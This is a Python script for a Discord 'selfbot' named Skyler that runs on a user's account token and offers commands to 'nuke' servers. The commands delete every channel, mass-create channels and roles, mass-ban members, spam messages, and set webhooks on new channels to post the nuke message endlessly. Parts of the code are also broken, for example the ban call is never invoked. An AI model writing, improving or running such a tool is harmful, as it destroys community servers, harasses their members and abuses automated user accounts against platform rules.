from discord.ext import commands
import discord
import random
from colorama import Back, Fore, Style
from discord import Webhook
from discord import RequestsWebhookAdapter
import os
import asyncio
from asyncio import tasks

token = input(Back.BLACK + Fore.BLUE + "[ " + Fore.RESET + "+" + Back.BLACK + Fore.BLUE + " ]" + Back.BLACK + Fore.RESET + " Enter Token" + Back.BLACK + Fore.BLUE + " : ")
prefix = input(Back.BLACK + Fore.BLUE + "[ " + Fore.RESET + "+" + Back.BLACK + Fore.BLUE + " ]" + Back.BLACK + Fore.RESET + " Enter Prefix" + Back.BLACK + Fore.BLUE + " : ")
nuke_message = input(Back.BLACK + Fore.BLUE + "[ " + Fore.RESET + "+" + Back.BLACK + Fore.BLUE + " ]" + Back.BLACK + Fore.RESET + " Enter Nuke Message" + Back.BLACK + Fore.BLUE + " : ")
os.system('clear')

bot = commands.Bot(command_prefix=prefix,self_bot=True, help_command=None)

@bot.event
async def on_ready():
	print(Back.BLACK + Fore.BLUE + "[ " + Fore.RESET + "Skyler Selfbot" + Back.BLACK + Fore.BLUE + " ]" + Fore.RESET)
	print(Back.BLACK + Fore.BLUE + "[ " + Fore.RESET + "Logged in as " + bot.user.name + Back.BLACK + Fore.BLUE + " ]" + Fore.RESET)
	print(Back.BLACK + Fore.BLUE + "[ " + Fore.RESET + "Prefix " + prefix + Back.BLACK + Fore.BLUE + " ]" + Fore.RESET)

			
@bot.event
async def on_guild_channel_create(channels):
      	webhook = await channels.create_webhook(name='Skyler')
      	while True:
      		await webhook.send(content=nuke_message)

				

@bot.command()
async def help(ctx):
	await ctx.send(f"""
	```
─────────┤sᴋʏʟᴇʀ sᴇʟғʙᴏᴛ├─────────
 {prefix}help - shows this
 {prefix}nuke - nukes server
 {prefix}ccr - creates channels
 {prefix}cdel - deletes channels
 {prefix}massban - bans all members
 {prefix}ping - shows ping
 {prefix}spam - <message>
 {prefix}rolespam - <name>
```
""")

@bot.command()
async def nuke(ctx):
	await ctx.message.delete()
	tasks = [cdel(ctx), ccr(ctx)]
	asyncio.gather(*tasks)

@bot.command()
async def ccr(ctx):
	await ctx.message.delete()
	for i in range(100):
		print(Back.BLACK + Fore.BLUE + "[ " + Fore.RESET + "Skyler Selfbot" + Back.BLACK + Fore.BLUE + " ]" + Fore.RESET + " Created Channel")
		await ctx.guild.create_text_channel(name="nuked")
		
		
@bot.command()
async def cdel(ctx):
	await ctx.message.delete()
	for i in range(100):
			print(Back.BLACK + Fore.BLUE + "[ " + Fore.RESET + "Skyler Selfbot" + Back.BLACK + Fore.BLUE + " ]" + Fore.RESET + " Deleted Channel")
			for channel in ctx.guild.channels:
				await channel.delete()

@bot.command()
async def massban(ctx):
    print(Back.BLACK + Fore.BLUE + "[ " + Fore.RESET + "Skyler Selfbot" + Back.BLACK + Fore.BLUE + " ]" + Fore.RESET + " Banned Member")
    for members in ctx.guild.members:
    	await ctx.ban_member

@bot.command()
async def ping(ctx):
	await ctx.message.delete()
	await ctx.send("``{format}ms.``", format(round(bot.latency, 100)))
	
@bot.command()
async def spam(ctx, message):
			await ctx.message.delete()
			for i in range(50):
				print(Back.BLACK + Fore.BLUE + "[ " + Fore.RESET + "Skyler Selfbot" + Back.BLACK + Fore.BLUE + " ]" + Fore.RESET + " Spamming")
				await ctx.send(message)
				

@bot.command()
async def rolespam(ctx, name):
	await ctx.message.delete()
	for x in range(500):
			print(Back.BLACK + Fore.BLUE + "[ " + Fore.RESET + "Skyler Selfbot" + Back.BLACK + Fore.BLUE + " ]" + Fore.RESET + " Spamming Roles")
			await ctx.guild.create_role(name=name)
			
						
												

	
		
			

bot.run(token, bot=False)
